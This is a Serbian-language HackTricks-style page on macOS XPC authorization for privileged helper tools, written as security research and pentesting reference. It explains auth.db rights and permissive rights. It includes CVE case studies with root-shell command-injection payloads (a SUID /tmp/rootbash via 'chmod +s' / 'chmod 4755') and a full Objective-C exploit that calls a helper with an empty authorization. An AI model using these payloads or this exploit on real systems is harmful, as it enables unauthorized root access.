# macOS XPC autorizacija

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC autorizacija

Apple takođe pruža drugi način za proveru da li povezani proces ima **dozvolu da pozove izloženi XPC metod**.<sup>[[2]](#references)</sup>

Kada aplikacija treba da **izvršava radnje kao privilegovani korisnik**, umesto pokretanja aplikacije kao privilegovanog korisnika, ona obično instalira HelperTool kao root korisnik, kao XPC servis koji aplikacija može da pozove radi izvršavanja tih radnji. Međutim, aplikacija koja poziva servis treba da ima dovoljnu autorizaciju.

### ShouldAcceptNewConnection uvek YES

Primer se može pronaći u [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). U `App/AppDelegate.m` pokušava da se **poveže** sa **HelperTool**. A u `HelperTool/HelperTool.m`, funkcija **`shouldAcceptNewConnection`** **neće proveriti** nijedan od prethodno navedenih zahteva. Uvek će vratiti YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Za više informacija o pravilnom konfigurisanja ove provere:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Prava aplikacije

Međutim, **autorizacija se obavlja kada se pozove metoda iz HelperTool-a**.

Funkcija **`applicationDidFinishLaunching`** iz `App/AppDelegate.m` kreira praznu authorization referencu nakon pokretanja aplikacije. Ovo bi uvek trebalo da funkcioniše.\
Zatim će pokušati da **doda neka prava** toj authorization referenci pozivanjem funkcije `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcija `setupAuthorizationRights` iz `Common/Common.m` će sačuvati prava aplikacije u auth bazi `/var/db/auth.db`. Obratite pažnju na to da će dodati samo prava koja još nisu u bazi:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcija `enumerateRightsUsingBlock` koristi se za dobavljanje dozvola aplikacija, koje su definisane u `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
To znači da će na kraju ovog procesa dozvole deklarisane unutar `commandInfo` biti sačuvane u `/var/db/auth.db`. Za **svaki metod** koji će **zahtevati autentikaciju**, baza sadrži **naziv dozvole** i **`kCommandKeyAuthRightDefault`**. Ovo drugo **označava ko može dobiti ovo pravo**.<sup>[[1]](#references)</sup>

Postoje različiti opsezi kojima se označava ko može pristupiti određenom pravu. Neki od njih su definisani u [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (možete [sve pronaći ovde](https://www.dssw.co.uk/reference/authorization-rights/)), ali ukratko:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Naziv</th><th width="165">Vrednost</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Bilo ko</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niko</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Trenutni korisnik mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Zatraži od korisnika da se autentifikuje.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Zatraži od korisnika da se autentifikuje. Mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Navedi pravila</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Navedi dodatne komentare o pravu</td></tr></tbody></table>

### Provera prava

U `HelperTool/HelperTool.m`, funkcija **`readLicenseKeyAuthorization`** proverava da li je pozivalac ovlašćen da **izvrši ovaj metod** pozivanjem funkcije **`checkAuthorization`**. Ova funkcija proverava da li **`authData`** koje je poslao proces koji poziva ima **ispravan format**, a zatim proverava **šta je potrebno da bi se dobilo pravo** za pozivanje konkretnog metoda. Ako je sve u redu, **vraćeni `error` će biti `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Da bi **proverio zahteve za dobijanje prava** da pozove tu metodu, `authorizationRightForCommand` proverava prethodno pomenuti objekat **`commandInfo`**. Zatim poziva **`AuthorizationCopyRights`** da proveri **da li pozivalac ima prava** da pozove funkciju (imajte na umu da zastavice omogućavaju interakciju sa korisnikom).<sup>[[1]](#references)[[3]](#references)</sup>

U ovom slučaju, za pozivanje funkcije `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` je definisan kao `@kAuthorizationRuleClassAllow`. Dakle, **svako može da je pozove**.

### Informacije o bazi podataka

Pomenuto je da se ove informacije čuvaju u `/var/db/auth.db`. Sva sačuvana pravila možete izlistati pomoću:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Zatim možete pročitati ko može da pristupi ovom pravu pomoću:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Možete pronaći **sve konfiguracije dozvola** [**ovde**](https://www.dssw.co.uk/reference/authorization-rights/), ali kombinacije koje neće zahtevati interakciju korisnika bile bi:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Ovo je najdirektniji ključ. Ako je podešen na `false`, navodi da korisnik ne mora da pruži autentikaciju da bi dobio ovo pravo.
- Koristi se **u kombinaciji sa jednom od 2 opcije u nastavku ili uz navođenje grupe** kojoj korisnik mora pripadati.
2. **'allow-root': 'true'**
- Ako korisnik radi kao root korisnik (koji ima povišene dozvole), a ovaj ključ je podešen na `true`, root korisnik bi potencijalno mogao da dobije ovo pravo bez dodatne autentikacije. Međutim, dostizanje statusa root korisnika obično već zahteva autentikaciju, tako da ovo za većinu korisnika nije scenario „bez autentikacije“.
3. **'session-owner': 'true'**
- Ako je podešen na `true`, vlasnik sesije (trenutno prijavljeni korisnik) automatski bi dobio ovo pravo. Ovo može zaobići dodatnu autentikaciju ako je korisnik već prijavljen.
4. **'shared': 'true'**
- Ovaj ključ ne dodeljuje prava bez autentikacije. Umesto toga, ako je podešen na `true`, to znači da se, nakon što je pravo autentikovano, ono može deliti između više procesa, bez potrebe da se svaki od njih ponovo autentikuje. Međutim, početno dodeljivanje prava i dalje bi zahtevalo autentikaciju, osim ako se ne kombinuje sa drugim ključevima kao što je `'authenticate-user': 'false'`.

Možete [**koristiti ovu skriptu**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) da biste dobili interesantna prava:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Studije slučajeva zaobilaženja autorizacije

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Privilegovani Mach servis `com.acustica.HelperTool` prihvata svaku konekciju, a njegova rutina `checkAuthorization:` poziva `AuthorizationCopyRights(NULL, …)`, tako da bilo koji blob od 32 bajta prolazi. `executeCommand:authorization:withReply:` zatim prosleđuje stringove odvojene zarezima, koje kontroliše napadač, funkciji `NSTask` sa privilegijama root korisnika, što omogućava payload-e kao što je:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivijalno kreirati SUID root shell. Detalji su u [ovom tekstu](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener uvek vraća YES, a isti NULL `AuthorizationCopyRights` obrazac pojavljuje se u `checkAuthorization:`. Metod `exchangeAppWithReply:` dvaput konkatenira napadačev unos u `system()` string, pa ubacivanje shell metakaraktera u `appPath` (npr. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) omogućava izvršavanje koda sa root privilegijama putem Mach servisa `com.plugin-alliance.pa-installationhelper`. Više informacija [ovde](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Pokretanje audita kreira `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, izlaže Mach servis `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez provere `AuthorizationExternalForm` ili code signature pozivaoca. Trivijalan exploit pomoću `AuthorizationCreate` kreira praznu referencu, povezuje se koristeći `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i poziva metod za izvršavanje proizvoljnih binarnih datoteka sa root privilegijama. Kompletne reversing beleške (zajedno sa PoC-om) nalaze se u [tekstu autora Mykola Grymalyuka](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac verzije 7.0.0–7.0.14, 7.2.0–7.2.8 i 7.4.0–7.4.2 prihvatale su posebno kreirane XPC poruke koje su stizale do privileged helper-a bez authorization gate-ova. Pošto je helper verovao sopstvenom privileged `AuthorizationRef`-u, svaki lokalni korisnik koji je mogao da šalje poruke servisu mogao je da ga navede da izvrši proizvoljne promene konfiguracije ili komande sa root privilegijama. Detalji se nalaze u [SentinelOne sažetku advisora](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Saveti za brzu trijažu

- Kada aplikacija isporučuje i GUI i helper, uporedite njihove code requirements i proverite da li `shouldAcceptNewConnection` zaključava listener pomoću `-setCodeSigningRequirement:` (ili validira `SecCodeCopySigningInformation`). Nedostatak provera obično dovodi do CWE-863 scenarija, kao u slučaju Jamf-a. Brzi pregled izgleda ovako:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Uporedite šta helper *misli* da autorizuje sa onim što klijent prosleđuje. Prilikom reverse engineering-a, postavite breakpoint na `AuthorizationCopyRights` i potvrdite da `AuthorizationRef` potiče iz `AuthorizationCreateFromExternalForm` (obezbeđuje ga klijent), a ne iz sopstvenog privilegovanog konteksta helper-a; u suprotnom ste verovatno pronašli obrazac CWE-863, sličan prethodnim slučajevima.

## Reverzno analiziranje autorizacije

### Provera da li se koristi EvenBetterAuthorization

Ako pronađete funkciju: **`[HelperTool checkAuthorization:command:]`**, proces verovatno koristi prethodno opisanu šemu za autorizaciju:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Ako ova funkcija poziva API-je kao što su `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` i `AuthorizationFree`, koristi obrazac [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Proverite **`/var/db/auth.db`** da biste videli da li je moguće dobiti dozvole za pozivanje neke privilegovane radnje bez interakcije korisnika.

### Komunikacija protokola

Zatim morate pronaći šemu protokola kako biste mogli da uspostavite komunikaciju sa XPC servisom.

Funkcija **`shouldAcceptNewConnection`** ukazuje na izvezeni protokol:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

U ovom slučaju imamo isto što i u EvenBetterAuthorizationSample-u; [**proverite ovu liniju**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kada znate naziv korišćenog protokola, moguće je **izvući njegovu definiciju zaglavlja** pomoću:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na kraju, samo treba da saznamo **name of the exposed Mach Service** kako bismo uspostavili komunikaciju sa njim. Postoji nekoliko načina da to pronađemo:

- U **`[HelperTool init]`**, gde možete videti Mach Service koji se koristi:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- U launchd plist fajlu:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Primer eksploatacije

U ovom primeru kreiraju se:

- Definicija protokola sa funkcijama
- Prazna autentifikacija koja se koristi za zahtev za pristup
- Veza sa XPC servisom
- Poziv funkcije ako je veza uspešna
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Drugi XPC pomoćnici za eskalaciju privilegija koji su zloupotrebljeni

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Servisi autorizacije](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Eskalacija privilegija u Jamf Compliance Editor-u](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Propust eskalacije privilegija u FortiClient Mac-u](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Lokalna eskalacija privilegija u Aquarius Desktop-u na macOS-u preko Acustica Audio HelperTool XPC servisa](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Lokalna eskalacija privilegija preko Plugin Alliance InstallationHelper XPC servisa](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Eskalacija privilegija u Apple EndpointSecurity framework-u (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Referenca prava autorizacije (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
